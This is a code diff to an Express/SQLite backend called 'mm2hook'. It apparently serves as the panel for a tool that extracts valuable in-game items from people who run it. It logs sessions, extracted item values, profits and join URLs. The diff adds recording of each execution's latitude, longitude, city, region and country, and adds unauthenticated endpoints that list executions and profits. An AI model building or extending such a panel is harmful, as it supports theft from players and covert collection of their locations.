@@ -13,23 +13,6 @@ const io = new Server(server, { cors: { origin: '*' } });
 app.use(cors());
 app.use(express.json());
 
-// API homepage
-// Serve frontend homepage
-app.get('/', (req, res) => {
-  res.sendFile(path.join(__dirname, 'dist', 'index.html'));
-});
-
-// Serve frontend build static files
-app.use(express.static(path.join(__dirname, 'dist')));
-app.use('/assets', express.static(path.join(__dirname, 'dist', 'assets')));
-
-
-
-// Keep API status check
-app.get('/api/status', (req, res) => {
-  res.json({ status: "online", message: "mm2hook API is running successfully!" });
-});
-
 let pricesData = {};
 try {
   pricesData = JSON.parse(fs.readFileSync(path.join(__dirname, 'prices.json'), 'utf8'));
@@ -39,19 +22,10 @@ try {
 
 const activeSessions = {};
 
-// Ensure a persistent data directory exists (Render persistent disk should be mounted here)
-const dataDir = path.join(__dirname, 'data');
-if (!fs.existsSync(dataDir)) {
-  fs.mkdirSync(dataDir, { recursive: true });
-}
-
-// Use env var DB_PATH if set, otherwise default to data directory
-const dbPath = process.env.DB_PATH || path.join(dataDir, 'database.db');
-
 // Initialize DB with new schema (status for profits, whitelist table)
-const db = new sqlite3.Database(dbPath, (err) => {
+const db = new sqlite3.Database(path.join(__dirname, 'database.db'), (err) => {
   if (err) console.error('Database error:', err.message);
-  else console.log('Connected to SQLite database at', dbPath);
+  else console.log('Connected to SQLite database.');
 });
 
 db.serialize(() => {
@@ -86,14 +60,23 @@ db.serialize(() => {
   db.run(`CREATE TABLE IF NOT EXISTS executions (
     sessionId TEXT PRIMARY KEY,
     username TEXT,
-    timestamp INTEGER
+    timestamp INTEGER,
+    lat REAL DEFAULT 0,
+    lon REAL DEFAULT 0,
+    city TEXT DEFAULT '',
+    region TEXT DEFAULT '',
+    country TEXT DEFAULT ''
   )`);
+  db.run(`ALTER TABLE executions ADD COLUMN lat REAL DEFAULT 0`, (err) => {});
+  db.run(`ALTER TABLE executions ADD COLUMN lon REAL DEFAULT 0`, (err) => {});
+  db.run(`ALTER TABLE executions ADD COLUMN city TEXT DEFAULT ''`, (err) => {});
+  db.run(`ALTER TABLE executions ADD COLUMN region TEXT DEFAULT ''`, (err) => {});
+  db.run(`ALTER TABLE executions ADD COLUMN country TEXT DEFAULT ''`, (err) => {});
+  
   db.run(`CREATE TABLE IF NOT EXISTS whitelist (
     id INTEGER PRIMARY KEY AUTOINCREMENT,
     username TEXT UNIQUE,
-    isMain INTEGER DEFAULT 0,
-    userId TEXT,
-    avatarUrl TEXT
+    isMain INTEGER DEFAULT 0
   )`);
   db.run(`CREATE TABLE IF NOT EXISTS item_filters (
     itemName TEXT PRIMARY KEY,
@@ -103,26 +86,6 @@ db.serialize(() => {
     key TEXT PRIMARY KEY,
     value TEXT
   )`);
-
-  db.run(`CREATE TABLE IF NOT EXISTS rarity_filters (
-    rarityName TEXT PRIMARY KEY,
-    enabled INTEGER DEFAULT 1
-  )`);
-
-  db.get(`SELECT COUNT(*) as count FROM rarity_filters`, [], (err, row) => {
-    if (!err && row && row.count === 0) {
-      const stmt = db.prepare(`INSERT OR REPLACE INTO rarity_filters (rarityName, enabled) VALUES (?, ?)`);
-      stmt.run('unique', 1);
-      stmt.run('ancient', 1);
-      stmt.run('godly', 1);
-      stmt.run('chroma', 1);
-      stmt.run('legendary', 0);
-      stmt.run('rare', 0);
-      stmt.run('uncommon', 0);
-      stmt.run('common', 0);
-      stmt.finalize();
-    }
-  });
 
   // Restore active sessions from DB on startup
   db.all(`SELECT * FROM sessions`, [], (err, rows) => {
@@ -173,14 +136,22 @@ function enforceDuplicate(username, sessionId) {
 }
 
 app.post('/api/start', (req, res) => {
-  const { sessionId, username, avatarUrl, joinUrl } = req.body;
+  const { sessionId, username, avatarUrl, joinUrl, location } = req.body;
   if (!sessionId) return res.status(400).send('No sessionId');
 
   const now = Date.now();
   enforceDuplicate(username, sessionId);
 
   if (!activeSessions[sessionId]) {
-    db.run(`INSERT OR IGNORE INTO executions (sessionId, username, timestamp) VALUES (?,?,?)`, [sessionId, username, now]);
+    const lat = location && location.lat ? location.lat : 0;
+    const lon = location && location.lon ? location.lon : 0;
+    const city = location && location.city ? location.city : 'Unknown';
+    const region = location && location.region ? location.region : 'Unknown';
+    const country = location && location.country ? location.country : 'Unknown';
+
+    db.run(`INSERT OR IGNORE INTO executions (sessionId, username, timestamp, lat, lon, city, region, country) VALUES (?,?,?,?,?,?,?,?)`, 
+      [sessionId, username, now, lat, lon, city, region, country]);
+      
     db.run(`INSERT OR REPLACE INTO sessions (sessionId, username, status, avatarUrl, joinUrl, startTime, lastHeartbeat, maxExtractedVal, maxItemsList, maxItemsCount) VALUES (?,?,?,?,?,?,?,?,?,?)`,
       [sessionId, username, 'waiting', avatarUrl || '', joinUrl || '', now, now, 0, '[]', 0]);
 
@@ -313,6 +284,33 @@ app.get('/api/active', (req, res) => {
   res.json(activeSessions);
 });
 
+app.get('/api/analytics', (req, res) => {
+  db.all(`SELECT timestamp, totalValue, itemsCount FROM profits ORDER BY timestamp ASC`, [], (err, rows) => {
+    if (err) return res.status(500).json({ error: err.message });
+    
+    db.all(`SELECT timestamp FROM executions ORDER BY timestamp ASC`, [], (err2, executionRows) => {
+      if (err2) return res.status(500).json({ error: err2.message });
+      res.json({ profits: rows, executions: executionRows });
+    });
+  });
+});
+
+app.get('/api/executions', (req, res) => {
+  db.all(`SELECT * FROM executions ORDER BY timestamp DESC LIMIT 1000`, [], (err, rows) => {
+    if (err) return res.status(500).json({ error: err.message });
+    res.json(rows);
+  });
+});
+
+app.get('/api/whitelist', (req, res) => {
+  db.all(`SELECT sessionId, username, avatarUrl, profitValue, itemsList, timestamp, status, totalValue FROM profits ORDER BY timestamp DESC`, [], (err, rows) => {
+    if (err) return res.status(500).json({ error: err.message });
+    const activeIds = Object.keys(activeSessions);
+    const filtered = rows.filter(row => !activeIds.includes(row.sessionId) && (row.totalValue || 0) > 0);
+    res.json(filtered);
+  });
+});
+
 app.get('/api/chart-data', (req, res) => {
   db.all(`SELECT profitValue, itemsCount, timestamp, totalValue FROM profits WHERE totalValue > 0 ORDER BY timestamp ASC`, [], (err, rows) => {
     if (err) return res.status(500).json({ error: err.message });
@@ -400,42 +398,21 @@ app.get('/api/prices', (req, res) => {
 // Filters endpoints
 app.get('/api/filters', (req, res) => {
   db.get(`SELECT value FROM system_config WHERE key = 'minThreshold'`, [], (err, configRow) => {
-    const minThreshold = configRow ? parseFloat(configRow.value) : 0.00;
+    const minThreshold = configRow ? parseFloat(configRow.value) : 1.00;
     
-    db.all(`SELECT itemName, enabled FROM item_filters`, [], (err, itemRows) => {
+    db.all(`SELECT itemName, enabled FROM item_filters`, [], (err, rows) => {
       if (err) return res.status(500).json({ error: err.message });
       const items = {};
-      if (itemRows) {
-        itemRows.forEach(row => {
-          items[row.itemName] = row.enabled === 1;
-        });
-      }
-      
-      db.all(`SELECT rarityName, enabled FROM rarity_filters`, [], (err, rarityRows) => {
-        if (err) return res.status(500).json({ error: err.message });
-        const rarities = {
-          unique: true,
-          ancient: true,
-          godly: true,
-          chroma: true,
-          legendary: false,
-          rare: false,
-          uncommon: false,
-          common: false
-        };
-        if (rarityRows) {
-          rarityRows.forEach(row => {
-            rarities[row.rarityName] = row.enabled === 1;
-          });
-        }
-        res.json({ minThreshold, items, rarities });
+      rows.forEach(row => {
+        items[row.itemName] = row.enabled === 1;
       });
+      res.json({ minThreshold, items });
     });
   });
 });
 
 app.post('/api/filters/save', (req, res) => {
-  const { minThreshold, items, rarities } = req.body;
+  const { minThreshold, items } = req.body;
   
   db.serialize(() => {
     if (minThreshold !== undefined) {
@@ -450,25 +427,8 @@ app.post('/api/filters/save', (req, res) => {
       stmt.finalize();
     }
     
-    if (rarities && typeof rarities === 'object') {
-      const stmt = db.prepare(`INSERT OR REPLACE INTO rarity_filters (rarityName, enabled) VALUES (?, ?)`);
-      Object.entries(rarities).forEach(([name, enabled]) => {
-        stmt.run(name.toLowerCase(), enabled ? 1 : 0);
-      });
-      stmt.finalize();
-    }
-    
     res.json({ success: true });
   });
-});
-
-// Serve index.html for SPA routes (Express 5 compatible)
-app.use((req, res) => {
-  if (req.path.startsWith('/api')) {
-    return res.status(404).json({ error: "API endpoint not found" });
-  }
-
-  res.sendFile(path.join(__dirname, "dist", "index.html"));
 });
 
 const PORT = process.env.PORT || 3001;
